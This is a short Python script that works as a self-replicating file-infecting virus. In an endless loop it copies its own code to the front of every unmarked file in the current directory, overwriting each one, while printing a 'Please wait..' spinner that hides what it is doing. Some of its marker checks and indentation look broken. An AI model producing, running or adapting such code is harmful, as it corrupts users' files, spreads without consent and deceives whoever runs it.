import os, time, sys, glob

while 1:
	the_code = []
	with open(sys.argv[0], 'r') as f:
		lines = f.readlines()
	self_replicating_part = False
	for line in lines:
		if line == "# SAYS HI!":
			self_replicating_part = True
		if not self_replicating_part:
			the_code.append(line)
		if line == "# SAYS BYE!\n":
			break
	python_files = glob.glob('*') + glob.glob('*.txt')
	for file in python_files:
	    with open(file, 'r') as f:
	    	file_code = f.readlines()
	    infected = False
	    for line in file_code:
	    	if line == "# SAYS HI!\n":
		    	infected = True
		    	break
	    if not infected:
			       final_code = []
			       final_code.extend(the_code)
			       final_code.extend('\n')
			       final_code.extend(file_code)
			       with open(file, 'w') as f:
			       	f.writelines(final_code)
	def countdown():
	       os.system("clear" or "cls")
	       print("Please wait.. |")
	       os.system("clear" or "cls")
	       print("Please wait.. /")
	       os.system("clear" or "cls")
	       print("Please wait.. -")
	       os.system("clear" or "cls")
	       print("Please wait.. \ ") 
	countdown()
